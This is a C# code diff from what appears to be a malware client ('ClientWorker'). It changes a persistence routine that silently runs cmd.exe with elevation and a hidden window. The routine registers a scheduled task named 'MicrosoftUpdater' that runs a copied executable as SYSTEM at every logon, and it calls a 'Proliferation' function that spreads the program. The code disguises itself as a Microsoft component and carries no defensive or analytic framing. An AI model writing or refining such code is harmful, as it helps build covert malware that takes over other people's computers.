@@ -164,7 +164,7 @@ namespace ClientWorker
         {
             Log.Send("Registration()");
             string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-            CreateTask();
+            CreateTask(folderPath + StartData.floaderNewCopy);
             Proliferation(folderPath);
         }
 
@@ -187,7 +187,7 @@ namespace ClientWorker
             }
         }
 
-        public static void CreateTask()
+        public static void CreateTask(string fileParth)
         {
             new Process
             {
@@ -195,7 +195,7 @@ namespace ClientWorker
                 {
                     FileName = "cmd.exe",
                     Verb = "runas",
-                    Arguments = "/C SCHTASKS /Create /RU SYSTEM /SC ONLOGON /TN MicrosoftUpdater /TR C:\\Users\\Fox\\AppData\\Roaming\\MicrosoftUpdater\\" + StartData.service,
+                    Arguments = "/C SCHTASKS /Create /RU SYSTEM /SC ONLOGON /TN MicrosoftUpdater /TR " + fileParth + StartData.service,
                     WindowStyle = ProcessWindowStyle.Hidden
                 }
             }.Start();
